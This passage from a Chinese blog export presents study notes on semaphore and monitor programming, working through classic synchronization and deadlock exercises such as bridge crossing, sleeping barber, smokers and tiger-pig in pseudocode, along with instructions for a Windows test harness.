即可跳过发送 t.SendFromReader(fileReader, int64(fileItem.size)) &#125; &#125;&#125; 专栏目录：顶点云（应用）设计与实现此专栏的上一篇文章：顶点云（应用）用户代理此专栏的下一篇文章：这是此专栏的最后一篇文章 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/15/zenith-cloud-8/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Golang","slug":"Golang","permalink":"http://forec.github.io/tags/Golang/"},{"name":"云存储","slug":"云存储","permalink":"http://forec.github.io/tags/云存储/"},{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"互斥读者-读者问题","slug":"os-concepts-16","date":"2017-01-08T09:52:59.000Z","updated":"2017-01-11T14:47:38.000Z","comments":true,"path":"2017/01/08/os-concepts-16/","link":"","permalink":"http://forec.github.io/2017/01/08/os-concepts-16/","excerpt":"在 操作系统（专题）：信号量编程（上） 中，我对《操作系统概念》原书课后习题 7.16 过桥问题做了一定改动，此部分记录对改动后题目的分析。","text":"在 操作系统（专题）：信号量编程（上） 中，我对《操作系统概念》原书课后习题 7.16 过桥问题做了一定改动，此部分记录对改动后题目的分析。 注：以下解法均已通过程序验证，不会发生饥饿或死锁，验证代码可在 这里 查看。 村庄过桥问题 原题大致翻译（原书 7.16）：一座桥连接了南北两个村庄，两个村庄的居民可以从桥上通过，但桥上不能同时承载两个人（无论同方向还是相向）。使用信号量保证死锁和饥饿都不会发生。 我个人对此题编写的信号量解法如下，通过两个互斥信号量均衡双方争夺过桥权限的次数： 12345678910111213141516171819202122232425262728293031323334int num_waiting_north = 0;int num_waiting_south = 0; // 南北方等待过桥人数semaphore mutex_south = 1;semaphore mutex_north = 1; // 南北方等待过桥人数修改互斥锁semaphore bridge = 1; // 过桥权限semaphore north_entry = 1;semaphore south_entry = 1; // 南北参与争夺桥的权限，开始双方均允许争夺void enter_bridge_north() &#123; // 北方居民试图过桥 wait(mutex_north); num_waiting_north ++; signal(mutex_north); wait(north_entry); // 将自己加入等待队列，如果等待队列有资源就可以等待桥资源 wait(bridge); // 过桥 wait(mutex_north); num_waiting_north --; signal(mutex_north); wait(mutex_south); if (num_waiting_south == 0) // 若南方当前无人准备过桥则本次过桥不计入争夺次数 signal(north_entry); else // 若南方有居民准备过桥则允许南方等待队列中的一个居民争夺过桥权限 signal(south_entry); signal(mutex_south); signal(bridge);&#125;void enter_bridge_south() &#123; // 南方居民试图过桥 // 与北方居民对称&#125; 互斥读者-读者问题 在 操作系统（专题）：信号量编程（下） 的 “简单信号量编程” 部分中，北京大学 1992 年的入学考试题实际也是对书后习题 7.16 的改动，即 同一方向允许多辆车依次通过但不允许两辆车相对行驶 ，但未要求不发生饥饿。 再对原题做了一点改变：将原题条件改成同一方向同时允许多个居民依次通过但不允许两个居民相向行走， 同时保证不发生饥饿现象 。 新的题目和原来的两道题目的主要区别 在于： 与教材 7.16 相比，教材 7.16 要求桥上任何时刻最多只能有一个人，而新的题目允许桥上 同时 出现多个同方向的居民。即原题要求 依次 通过，所以即使是同方向的居民也需要等待；新的题目允许 同时 通过，即同方向的居民无需等待。 与北京大学 1992 入学考试题相比，原题允许同方向多辆车同时通过，但未要求保证不发生饥饿，而新的题目要求保证不发生饥饿现象。 我个人认为改造后的问题等价为读者-写者问题的变种：将读者-写者问题中的写者也换成另一类读者，并且要保证没有饥饿现象。因此我将改造后的问题称作 互斥读者-读者问题 ，只需要对第三读者写者问题中的写者稍作处理就可以使用第三读者写者问题的解法实现。我基于第三读者-写者问题编写的信号量解法如下，解法依赖于信号量自身进程队列的先进先出特性： 12345678910111213141516171819202122232425262728int num_waiting_north = 0;int num_waiting_south = 0; // 南北等待人数semaphore north_mutex = 1;semaphore south_mutex = 1; // 修改等待人数的互斥锁semaphore bridge = 1; // 桥资源semaphore queue = 1; // 通过信号量的先进先出维护双方居民顺序void enter_bridge_north() &#123; // 北方居民尝试过桥 wait(queue); wait(north_mutex); num_waiting_north++; if (num_waiting_north == 1) // 第一个北方居民要获得桥的通过权 wait(bridge); signal(queue); signal(north_mutex); // 过桥 wait(north_mutex); num_waiting_north --; if (num_waiting_north == 0) // 最后一个离开的北方居民交出桥的通过权权 signal(bridge); signal(north_mutex);&#125;void enter_bridge_south()&#123; // 南方居民尝试过桥 // 与北方居民过桥对称&#125; 对于上面改造后的问题，通过转换为第三读者-写者问题得到的解法 依赖于信号量进程队列的先进先出特性 。我构想了另一种解法（下面的代码），但我认为这种解法有些过于复杂，并且依赖状态的记录。此算法已经经过程序验证。或者你有另外的解法，请一定要告诉我（在评论中留言或 点此 向我发送邮件）！ 12345678910111213141516171819202122232425262728293031323334353637383940// 其它变量和上面代码相同bool north_entered = FALSE;bool south_entered = FALSE; // 我方自上次对方通过桥后是否又有人通过桥semaphore north_entry = 1;semaphore south_entry = 1; // 双方居民争夺桥权的资格void enter_bridge_north() &#123; // 北方居民过桥 wait(mutex_north); num_waiting_north ++; signal(mutex_north); wait(north_entry); // 此句必须放置在 num_waiting_north++ 后，否则一方通过后将再无机会 // 打断对方的权限，直到对方主动交出 if (num_waiting_north == 1) &#123; // 第一个北方居民要获取桥的资源 wait(bridge); &#125; north_entered = TRUE; // 标记北方已经有人通过桥 if (num_waiting_south == 0) // 南方无人等待过桥则允许下一个北方居民过桥 // 如果南方有人过桥，过桥后一定会再次给北方机会所以跳过此步 signal(north_entry); // 过桥 wait(mutex_north); num_waiting_north --; if (south_entered) &#123; signal(south_entry); south_entered = FALSE; &#125; // 如果有南方居民已经通过桥，则说明 south_entry 为 0，因为最后 // 一个通过的南方居民没有机会对 south_entry 做 signal。这样最后 // 一个离开的北方居民需要将 south_entry 置为 1，使南方居民能够获得过桥资格。 signal(mutex_north); signal(bridge);&#125;void enter_bridge_south() &#123; // 南方居民过桥 // 与北方居民对称&#125; 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（十五）：信号量编程（下）此专栏的下一篇文章：专栏已结束 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/08/os-concepts-16/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（专题）：信号量编程（下）","slug":"os-concepts-15","date":"2017-01-08T03:53:13.000Z","updated":"2017-01-11T15:10:32.000Z","comments":true,"path":"2017/01/08/os-concepts-15/","link":"","permalink":"http://forec.github.io/2017/01/08/os-concepts-15/","excerpt":"此部分包括一些和 《信号量编程（上）》 相比稍难的信号量编程习题，可能有一小部分超出了考试范畴。这部分习题的解答均根据我个人理解编写， 不保证提供的答案绝对正确或最优 。","text":"此部分包括一些和 《信号量编程（上）》 相比稍难的信号量编程习题，可能有一小部分超出了考试范畴。这部分习题的解答均根据我个人理解编写， 不保证提供的答案绝对正确或最优 。 注 1：习题主要来自 2000 年左右的各高校入学考试题，部分来自网络以及经典的信号量问题。 注 2：以下问题顺序随机，难度之间并无递增/递减关系，可能有部分问题超出考试范畴。但其中第 1 ~ 4 题和之前 信号量编程（上） 中的习题 7.16 类似，之间存在类比、递进的关系。 注 3：我提供了一份比较简陋的代码，可以帮助你 测试设计的信号量算法是否正确 。详细可查看本文末尾的 “信号量编程测试”。 单向行驶问题 （北京大学 1992 年）有一座桥连接了南北两侧，两侧均有车辆试图到另一侧，桥上不允许两车交会，但允许相同方向多辆车依次通行（桥上可以有多个同方向的车）。用信号量实现交通管理。 本题和 信号量编程（上） 中的习题 7.16 （过桥问题）类似，但过桥问题要求桥上同时只能通过一人且保证不出现饥饿现象（习题 7.15 不要求处理饥饿，7.16 要求保证不会发生饥饿），所以此处我将其称之为单向行驶问题。我对本题的进一步修改和分析记录在 互斥读者-读者问题 中。 分析：因为同方向允许多辆车连续通行，很容易联想到读者-写者问题的读者。在 操作系统（五）：进程互斥 里介绍的读者-写者问题中，允许多个到来的读者一起读数据库。将车辆视作读者，同方向到来的多个车辆可以依次通过而不必等待。既然允许多个读者，就必须记录当前的 “读者”，也就是这里的汽车数量。 定义信号量和变量如下： count1 = count2 = 0 ：分别记录当前已经位于桥上的南北两个方向来车数量，显然两个变量要么均为 0，要么一个非 0 而另一个就必须为 0。 mutex1 = mutex2 = 1 ：用于控制对 count1 和 count2 的互斥操作。 bridge = 1 ：过桥的权限。 代码如下 12345678910111213141516171819int count1 = count2 = 0;semaphore mutex1 = mutex2 = 1;semaphore bridge = 1;// 北方来车void car_from_north() &#123; wait(mutex1); count1 ++; if (count1 == 1) wait(bridge); signal(mutex1); // 过桥 wait(mutex1); count1 --; if (count1 == 0) signal(bridge); signal(mutex1);&#125;// 南方来车与北方对称 士兵过桥问题 独木桥的左右两端各停留一队士兵，左侧有 m 个，右侧有 n 个。两侧士兵均可上桥，但一旦有一侧士兵上桥，另一侧士兵必须等待已上桥一侧的士兵全部通过后才可上桥。试使用信号量描述此过程。 分析：与单向行驶问题类似，只需要保证一方先全部通过即可。因此需要记录两侧的人数。 定义变量和信号量： int left = 0, right = 0 ：记录左右两侧已经通过的士兵数目 semaphore left_mutex = right_mutex = 1 ：操作变量 left 和 right 的互斥锁 semaphore bridge = 1 ：桥的资源 代码如下 1234567891011121314// 左侧士兵do &#123; wait(left_mutex); left ++; int number = left; // 临时变量记录自己是第几个通过的士兵 if (left == 1) wait(bridge); signal(left_mutex); // 过桥 if (number == m) signal(bridge);&#125; while (TRUE); // 右侧士兵与左侧同理 有限双向行驶问题 （南开大学 1997 年题）在南开大学和天津大学之间有一条小路 S -&gt; T，小路中间有一个安全岛 M，安全岛能够同时容纳两辆自行车，可供两个已经从两端进入小路的自行车错车用。整个地图如下图，S 到 K 段的小路和 T 到 L 段的小路同时都只能允许一辆自行车通过。试设计一个算法，使来往的自行车都能顺利通过。 此题和上面的单向行驶问题类似，但同时每个方向只能允许一辆车通过，并且允许两个方向各有来车一辆。此题和教材 7.16 过桥问题也非常相似。应当注意体会本题和单向行驶、习题 7.16 的区别与联系。 分析：需要先确定需要用信号量维护的资源对象种类和数量。首先 S 端和 T 端能且仅能进入一辆自行车，直到进入的自行车从另一端离开，否则在我方通行两辆自行车期间，一旦对方有来车就会出现死锁。正因为 S 和 T 端最多只能进入一辆，所以安全岛 M 最多也只会出现两辆自行车，所以不需要为 M 设置信号量。此外，除了要控制路口 S 和 T 的进入权限，还要控制两段小路 S-K 和 L-T 的通行权限，不能允许从 S 方向进入的自行车和从 T 方向进入的自行车同时进入这两段小路。因此共有 4 个互斥信号量。 声明信号量： semaphore S = T = 1 ：两端最多允许进入一辆 semaphore SK = LT = 1 ：两段小路最多允许进入一辆 代码如下： 1234567891011121314// S 口进入的自行车do &#123; wait(S); wait(SK); // 通过 S-K 段小路 signal(SK); // 进入安全岛 M wait(LT); // 通过 L-T 段小路 signal(LT); signal(S);&#125; while (TRUE);// T 口进入的自行车与 S 口进入的自行车对称 互斥读者-写者问题 具体见 互斥读者-读者问题 理发店问题 （原书书后习题 6.11 ，有修改）一个理发店配有一个有 10 个椅子的休息室和一个有理发椅的理发室。如果没有顾客则理发师睡觉；如果顾客来了而休息室、理发椅都没有空则离开；如果理发师在忙而有空的椅子，则顾客选择一个坐下等待；如果理发师在睡觉则顾客摇醒他。 分析：理发师在没有顾客时睡觉，并且顾客在没有空椅时离开，因此应当记录顾客的数量。 定义信号量： int count = 11 ：空闲的椅子数量 semaphore mutex = 1 ：对椅子数量的修改互斥 semaphore barber_chair = 1 ：理发师互斥，同时只能给一个人理发 semaphore customers = 0 ：顾客人数 代码如下： 123456789101112131415161718192021222324252627// 顾客do &#123; wait(mutex); if (count == 0)&#123; signal(mutex); return; &#125; if (count == 11)&#123; signal(customers); // 唤醒 barber &#125; count --; signal(mutex); wait(barber_chair); // 理发&#125; while (TRUE);// 理发师do &#123; wait(customers); // 睡觉等待顾客 // 被唤醒 // 剪发 wait(mutex); count ++; signal(mutex); signal(barber_chair); // 下一个客人剪发&#125; while (TRUE); 上面的代码将顾客排队顺序交给了信号量自身的排队机制处理，如果需要确保顾客能够维持一个先来先服务的剪发顺序，则需要维护一个容量为 11 的队列，顾客到来后加到队列尾部，每次从队头取走最先到来的顾客。 上机实习问题 某高校计算机系安排学生上机实习，机房共 30 台机器，有超过 60 名学生选课。规定每两个学生一组，一组占一台机器，协同完成实习。只有凑够两个学生且机房仍有空闲机器的情况下，门卫才允许该组学生进入机房。每组上机实习结束时需要由一名固定的老师检查完毕后，该组学生才可离开。 分析：互斥资源有需要检查的教师，同步资源涉及机房里的 30 台机器。此外，学生必须两两凑成一组才能进入机房，因此需要维护当前准备进入机房的学生人数，一旦超过 1 个人就可以组成一组。此外，应当注意学生组队和获取机器的先后关系，为了保证两个学生只获取一台机器，可以只使偶数号到来的学生获取机器，因为偶数号学生到来时可以保证能够凑成至少一组。本题涉及的进程只有学生。 定义信号量： int count = 0 ：开始时在机房外等候的学生人数 semaphore mutex = 1 ：修改学生人数的互斥信号量 semaphore teacher = 1 ：验收的老师 semaphore machine = 30 ：30 台机器 代码如下 12345678910111213141516171819202122// 学生进程do &#123; wait(mutex); count++; int temp = count; // 记录自己的编号 if (count % 2 == 0) // 偶数号学生 wait(machine); signal(mutex); // 上机 // 上机完成，等待验收 wait(teacher); // 验收 signal(teacher); if (temp % 2 == 0)&#123; signal(machine); // 由偶数号学生释放机器 // 必须先释放机器再尝试获取 mutex // 因为等待的偶数号学生先获取了 mutex，并且正在等待机器 wait(mutex); count -= 2; // 一组学生离开 signal(mutex); &#125;&#125; while(TRUE); 吸烟者问题 假设一个系统有 3 个吸烟者进程和一个供应商进程，制造一根香烟需要三种材料各一份。三个吸烟者分别无限量的拥有三种材料中的一种。供应商进程可以无限量的供应这三种材料，一旦一个吸烟者想吸烟，则他向供应商发出请求，供应商会为这个吸烟者提供另外两种材料。供货商同时只能为一个吸烟者提供服务，多个吸烟者同时发出请求时按固定顺序服务。如此循环往复，请用信号量编写程序控制四个进程同步执行。 分析：供货商需要判断有哪些吸烟者当前试图吸烟，因为可能有多个吸烟者发出请求，因此供货商需要分别判断。吸烟者需要三种材料中的两种，因此每种材料需要设置一个信号量表示资源请求。此外多个吸烟者同时发出请求，那么它们可能会同时争抢供货商提供的某个材料，因此需要一个互斥信号量控制提出请求的权限。 代码如下 12345678910111213141516171819202122232425262728293031bool smoker1, smoker2, smoker3; // 分别表示 1、2、3 吸烟者是否发出请求semaphore a = b = c = 0; // 初始供应的三种材料数量，1、2、3 号吸烟者分别持有 a、b、c类型材料semaphore smoker_request = 1; // 吸烟者发出请求权限// 供应商do &#123; if (smoker1 == TRUE) &#123; // 吸烟者 1 有请求 signal(b); signal(c); &#125; if (smoker2 == TRUE) &#123; // 吸烟者 2 有请求 signal(a); signal(c); &#125; if (smoker3 == TRUE) &#123; // 吸烟者 3 有请求 signal(b); signal(a); &#125;&#125; while(TRUE);//吸烟者 1do &#123; wait(smoker_mutex); smoker1 = TRUE; wait(b); wait(c); signal(smoker_mutex);&#125; while (TRUE); 苹果-橘子或老虎与猪 两类问题本质一样，描述不同，在期中考试已经出现过。老虎与猪的描述如下：有一个笼子可以容纳一只老虎或者两只猪，如果笼子中已经有猪，则老虎不能被放入。猎人 A 每次向笼子中放入一只老虎，猎人 B 每次向笼子中放入一只猪。饲养员每次会从笼子中取出一只老虎，厨师每次会从笼子中取出一只猪。对笼子的操作是互斥的。试用信号量描述此过程。 分析：此题的关键在于笼子中允许有两只猪，而当笼子中有猪时就无法放入老虎，因此需要维护猪的数量。猎人 A 需要和饲养员维持同步关系，猎人 B 需要和厨师维持同步关系。本题其实也可以看作生产者-消费者问题和第一类读者-写者问题的结合，但限制了读者的数量。 变量和信号量定义： int pig_count = 0 ：笼子中当前猪的数量 semaphore coop = 1 ：笼子的互斥锁 semaphore tiger = 0 ：用于在猎人 A 和饲养员之间的同步，同时这个信号量和 coop 也是互补的 semaphore pig = 0 ：用于在猎人 B 和厨师之间同步 semaphore pig_space = 2 ：用于限制可以放置猪的剩余空间 semaphore pig_count_mutex = 1 ：用于限制对 pig_count 的互斥访问 代码如下 123456789101112131415161718192021222324252627282930313233343536373839// 猎人 Ado &#123; // 抓到一只老虎 wait(coop); // 将老虎放入笼子 signal(tiger);&#125; while (TRUE);// 饲养员do &#123; wait(tiger); // 从笼子中取出老虎 signal(coop);&#125; while (TRUE);// 猎人 Bdo &#123; // 抓到一只猪 wait(pig_space); wait(pig_count_mutex); pig_count ++; if (pig_count == 1) wait(coop); // 笼子中没有猪的情况下要等待笼子权限 // 将猪放入笼子 signal(pig_count_mutex); signal(pig);&#125; while (TRUE);// 厨师do &#123; wait(pig); wait(pig_count_mutex); // 从笼子中取出一只猪 pig_count --; if (pig_count == 0) signal(coop); signal(pig_count_mutex); signal(pig_space);&#125; while (TRUE); 信号量编程测试 我编写了一点简单的测试代码（Windows 下）来辅助测试信号量算法能否工作成功。你可以在 这里 获取这些代码。 代码包括一个基类 WorkStation（包含在 base.hpp 中） 和两个可以用来做参考的测试文件。其中 bridge1.cpp 用来验证 信号量编程（上） 中习题 7.16， bridge2.cpp 用来验证 互斥读者-读者问题 中我针对修改后问题给出的自己的解答。你可以仿照这两个文件，继承 WorkStation 类来测试自己的信号量程序。 测试举例：以上面的老虎与猪问题为例，定义一个类 Coop 继承 WorkStation。 将所需变量添加到子类中，并实现虚方法 init()，该方法对你需要用到的信号量/变量做初始化。注意 init() 函数中需要设置 thread_type，这个变量表示有多少不同类型的进程，此问题有 4 种（猎人 A、B，厨师、饲养员），故 thread_type 应当为 4。 定义自己的参数结构体，对于上面老虎与猪问题而言需要将所用到的所有变量/信号量的地址放置到一个结构体中，对于此问题为： 1234struct Param&#123; int *pig_count; HANDLE *coop, *tiger, *pig; HANDLE *pig_space, *pig_count_mutex; 实现虚函数 void * getParam(int index)，此函数格式比较固定，对于此问题应当为： 123456789void * getParam(int index)&#123; Param *p = new Param; p-&gt;pig_count = &amp;pig_count; p-&gt;coop = &amp;coop; p-&gt;tiger = &amp;tiger; p-&gt;pig = &amp;pig; p-&gt;pig_space = &amp;pig_space; p-&gt;pig_count_mutex = &amp;pig_count_mutex;&#125; 实现四个进程对应的函数，只需要将已经写好的代码复制到你的代码中，格式参考 bridge1.cpp 和 bridge2.cpp。例如上面的猎人 A，应当写为： 1234567DWORD WINAPI hunter_A(LPVOID param)&#123; Param p = *(Param*) param; // 抓到一只老虎 WaitForSingleObject(*(p.coop), INFINITE); // 将老虎放入笼子 ReleaseSemaphore(*(p.coop), 1, NULL);&#125; 假设你实现的代表四个进程的四个函数分别名为 hunter_A、hunter_B、cook 和 feeder。则向 init() 函数添加下面的代码更新驱动表： 1234_threads[0] = hunter_A;_threads[1] = hunter_B;_threads[2] = cook;_threads[3] = feeder; 修改 main() 函数以测试。将 main() 函数中 simulate() 方法的第一个参数修改为 1，此参数表示每个进程创建多少个实例，此问题四种进程各一个，因此为 1。后一个参数表示程序运行多久退出，通常默认 60s 足够测试完成。 专栏目录：计算机理论基础此专栏的上一篇文章：操作系统（专题）：信号量编程（上）此专栏的下一篇文章：互斥读者-读者问题 参考资料：《操作系统概念 英文第七版》，恐龙书，英文名《Operating System Concepts》，作者 Abraham Silberschatz、Peter Baer Galvin、Greg Gagne 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://blog.forec.cn/2017/01/08/os-concepts-15/) 、作者信息（Forec）和本声明。","categories":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}],"tags":[{"name":"OS","slug":"OS","permalink":"http://forec.github.io/tags/OS/"}],"keywords":[{"name":"计算机理论基础","slug":"计算机理论基础","permalink":"http://forec.github.io/categories/计算机理论基础/"}]},{"title":"操作系统（专题）：信号量编程（上）","slug":"os-concepts-14","date":"2017-01-06T09:21:43.000Z","updated":"2017-01-11T15:16:20.000Z","comments":true,"path":"2017/01/06/os-concepts-14/","link":"","permalink":"http://forec.github.io/2017/01/06/os-concepts-14/","excerpt":"此部分主要包括原书第六章（进程同步）和第七章（死锁）的部分习题（有些不属于考试范围），以及一些简单信号量编程习题（低于考试难度）的分析。这部分习题的解答均根据我个人理解编写或翻译， 不保证提供的答案绝对正确或最优 。稍微复杂一些的信号量编程在 《信号量编程（下）》。","text":"此部分主要包括原书第六章（进程同步）和第七章（死锁）的部分习题（有些不属于考试范围），以及一些简单信号量编程习题（低于考试难度）的分析。这部分习题的解答均根据我个人理解编写或翻译， 不保证提供的答案绝对正确或最优 。稍微复杂一些的信号量编程在 《信号量编程（下）》。 原书选题课后习题的解答主要是我对原书答案的翻译和解释。此外： “进程同步”中，第 6 题之后（含第 6 题）超出考试范围 “死锁”中，第 5 题超出考试范围 进程同步 证明 进程互斥 中介绍的 Peterson 算法 满足临界区的三个要求。 参考 进程互斥 - Peterson 算法 。 什么是 忙等待（busy waiting） ？操作系统中还有哪些等待方式？忙等待可以被完全避免吗？ 忙等待意味着进程在等待一个条件被满足，并且进程在等待的过程中仍然不放弃对 CPU 的控制（如通过 while 循环不断判断条件是否被满足）。 操作系统可以在一个进程等待某条件时将 CPU 控制权限交给其他进程，而等待的进程可以在将来某个合适的、条件满足的情况下被唤醒。 忙等待可以被避免，但需要在进程的调度上花费更多的资源。等待进程需要被挂起，等到进程等待的条件满足时再唤醒。 试解释为什么 自旋锁（旋转锁，spinlock） 不适合单处理器系统，但在多处理器系统中很常用。 对于单处理器系统：一个进程使用自旋锁等待条件时仍然占据着唯一的 CPU，其他进程得不到执行，而占据 CPU 的进程等待的条件需要其它进程的执行才能得到满足。 对于多处理器系统：进程使用自旋锁时占据着一个 CPU 资源，而其他进程可以在剩余的 CPU 上运转，并且改变某些数据从而使停滞在旋转锁的进程的等待条件得到满足。 试解释为什么在单处理器系统的用户进程中通过屏蔽中断来实现同步是不合理的。 如果用户进程具有屏蔽中断的权限，那么它可以同样屏蔽计时器中断，没有时钟中断则分派程序无法运行，进程会无限执行。 试解释为什么在多处理器系统系统中无法通过屏蔽中断来实现同步。 屏蔽中断仅仅阻止其他进程在被屏蔽了中断的处理器上运行，其他进程可能在其它处理器上运行。 试在多处理器环境下通过 TestAndSet() 指令实现 wait() 和 signal() 信号量操作。 初始定义 int semaphore_value = 0 表示当前信号量剩余资源，定义 bool guard = TRUE 保证对 semaphore_value 的互斥修改。123456789101112131415161718192021void wait()&#123; while (TestAndSet(&amp;guard) == TRUE); if (semaphore_value == 0)&#123; // 暂时没有资源可用，将进程挂起到信号量队列中 &#125; else &#123; semaphore_value --; &#125; guard = FALSE;&#125;void signal()&#123; while (TestAndSet(&amp;guard) == TRUE); if (semaphore_value == 0 &amp;&amp; there's a process waiting in the queue)&#123; // 信号量资源数为 0 并且有进程挂起在信号量中 // 唤醒该进程 &#125; else &#123; semaphore_value ++; &#125; guard = FALSE;&#125; 证明 管程（monitor） 和信号量可以互相实现。 操作系统（六）：管程 - 使用信号量实现管程 使用管程实现信号量：123456789101112131415monitor semaphore &#123; int value = 0; condition c; signal() &#123; value ++; c.signal(); &#125; wait() &#123; while (value == 0) c.wait(); // 注意体会此处 while 而非 if 的意义 value --; &#125;&#125; 使用管程实现有限缓冲的生产者 - 消费者模型。 123456789101112131415161718192021monitor bounded_buffer &#123; int items[MAX_ITEMS]; // 生产的资源缓冲区 int numItems = 0; // 缓冲区内当前资源数目 condition full, empty; void produce(int v) &#123; while (numItems == MAX_ITEMS) full.wait(); // 缓冲区满时将生产者挂起到条件变量 full items[numItems++] = v; empty.signal(); &#125; int consume() &#123; int retVal; // 临时变量保存返回值 while (numItems == 0) empty.wait(); // 缓冲区为空将消费者挂起到条件变量 empty retVal = items[--numItems]; full.signal(); return retVal; &#125;&#125; 试提出一种解决读者-写者问题中饥饿现象的方法。 第 3 类读者-写者问题的一种解答：操作系统（五）：进程同步 - 第三读者-写者问题 另一种方案：每个读者/写者都保留开始等待时刻的时间戳，当一个写者完成写任务后，会唤醒等待时间最长的进程。当有读者正在临界区内而有新读者到来时，新读者必须在没有写者在等待的情况下才能也进入临界区。 信号量的 signal() 和管程中条件变量 signal 操作的区别。 如 操作系统（六）：管程 所讲，管程模式下的 x.signal() 和信号量的 signal() 区别在于： 信号量操作 signal() 会影响信号量的状态 ，而管程下的 x.signal() 在 x 不存在挂起进程的情况下没有任何影响。 一个系统包含 n 个进程 P1~n，每个进程都有唯一的优先级编号，共有 3 台打印机供这 n 个进程使用。试通过管程实现按优先级调度的资源分配。12345678910111213141516171819202122232425262728monitor printers &#123; int num_avail = 3; // 可用资源数量 int num_waiting; // 等待进程数量 int waiting_processes[MAX_PROCS]; // 等待进程列表 condition c; void request_printer(int proc_number) &#123; if (num_avail &gt; 0) &#123; // 有资源可分配则进程直接获得 num_avail --; return; &#125; waiting_processes[num_waiting] = proc_number; num_waiting++; sort(waiting_processes); while (num_avail == 0 &amp;&amp; waiting_processes[0] != proc_number) // 当可用资源数量为 0 并且当前进程不处于等待队列的第一位 c.wait(); waiting_processes[0] = waiting_processes[--num_waiting]; sort(waiting_processes); num_avail--; // 使用一个资源 &#125; void release_printer() &#123; num_avail ++; c.signal(); &#125;&#125; 死锁 考虑教材 7.1 描述的交通死锁问题（如下图所示），试说明死锁发生的四个必要条件在这个问题中均得到满足，并简述在这个问题中避免死锁的方案。（原书 7.1） 死锁发生的四个必要条件分别是：互斥、占有并等待、非抢占和循环等待。因为只有一条道路的每个位置上只能由一辆车占据，故满足资源互斥；当一辆车占据道路上某个位置时，它必须等待前面的车移动（获取新位置）才可以移动，，即占有并等待；一辆车不能被移开，故此系统为非抢占；每个车都在等待前面的车移动，每个十字路口的车辆则循环等待下一个十字路口的车辆移动，故循环等待。 一个简单的方案是：当十字路口已存在车辆时，新到来的车辆不能进入十字路口。 在真实计算机系统中，无论是可用资源还是进程对资源的需求都会随着时间的推移而改变。假设现在系统处于安全状态（通过银行家算法计算出），那么对于下面的几种改变，哪些改变执行之后一定能维持系统的安全状态？（原书 7.5） 增加可用资源：维持安全状态 减少可用资源：可能导致死锁，因为银行家算法计算出的安全状态是基于改变前的资源数量 增加某个进程所需要的最大资源数量：可能导致死锁，理由同上 减少某个进程所需要的最大资源数量：维持安全状态 增加进程数量：可能导致死锁，理由同上 减少进程数量：维持安全状态，进程退出竞争必然使可用资源增加或保持不变 一个系统有四个相同类型的资源，它们被三个进程同时共享，每个进程最多需要两个资源。试证明这个系统不会发生死锁。（原书 7.6） 假设系统发生死锁，则必然满足占有并等待和循环等待的条件。故每个进程都持有一个资源（若持有两个则已经满足要求，可以运行结束并释放），并且每个进程都在等待下一个资源。根据狄利克雷抽屉原理，四个资源分配给三个进程，必然有一个进程获得两个资源，这个进程必然可以执行完毕，然后释放持有的全部资源以使其它进程得以执行。 一个系统有 m 个相同类型的资源，它们被 n 个进程同时共享。在每个时刻，进程只能至多申请或者释放一个资源。假设系统满足以下两个条件：每个进程所需的最大资源数量在 1~m 个之间、所有进程的最大资源需求数量之和小于 m+n 个，试证明这个系统不会发生死锁。（原书 7.7） 解答 1：每个进程尚需的资源向量 Need[i,] = Max[i,] - Allocation[i,]。假设存在死锁，则必有 Σ(i = 1 to n) Allocation[i,] = m ，即所有资源都已经分配，没有资源空闲。 因为进程所需的资源总和不超过 m+n·，故 Σ Need[i,] + Σ Allocation[i,] = Σ Max[i,] &lt; m + n ，和上式结合化简即为 Σ Need[i,] &lt; n 。 因为 n 个进程所需的资源总数小于 n，意味着至少有一个进程 P 还需要 0 个资源，所以进程 P 能够执行到结束。又每个进程所需的最大资源数量不少于 1 个，故 P 执行结束后会释放至少一个资源。因此系统不会产生死锁。 解答 2：假设系统正在发生死锁，则当前状态下的 m 个资源已经全部被 n 个进程所占用，而这 n 个进程还需要更多的资源才能继续运行，也就是说每个进程还需要至少一个资源。因此，系统内 n 个进程正常运行所需要的资源总和大于或等于 m+n，与题意矛盾。故系统不可能发生死锁。 一座桥连接了南北两个村庄，两个村庄的居民可以从桥上通过，但桥上不能同时承载两个人（无论同方向还是相向，这里原题中只要求不能同时相向行走）。使用信号量保证死锁和饥饿都不会发生。（原书 7.16） 注 1：如果将此题的限制改为两个方向的人依次行走，即南向北过桥后，下一次应当是北向南，则此问题等同于缓冲区大小为 1 的生产者-消费者问题。 注 2：此题要求不会产生饥饿现象，则需要考虑两个方面，既要保证不能有一方一直持有过桥的权利，还要保证某一方过桥后，任何一方再次过桥不会依赖已过桥的居民影响（临界区问题的“发展”要求）。 注 3：此题是原书课后习题，课后的 7.15 和 7.16 是递进关系。《信号量编程（下）》中北京大学 1992 年入学考试题（单向行驶问题）也与此题类似。我对该题又做了新的改动，本题的信号量解法以及改动后题目的相关分析均记录在 《互斥读者-读者问题》，如果你有兴趣，欢迎与我讨论改动后题目的解法 。 原书答案给出了管程解法，对其做了一定修改如下： 1234567891011121314151617181920212223242526272829303132monitor bridge &#123; int num_waiting_north = 0; // 北方村庄等待过桥人数 int num_waiting_south = 0; // 南方村庄等待过桥人数 int prev = 0; // prev 为 0 表示上一次上桥的人是北方居民，否则为南方居民 bool on_bridge = FALSE; // 桥上是否有人 condition ok_to_cross; // 条件变量 void enter_bridge_north() &#123; // 北方村庄居民试图过桥 num_waiting_north++; while (on_bridge || // 桥上有人 (prev == 0 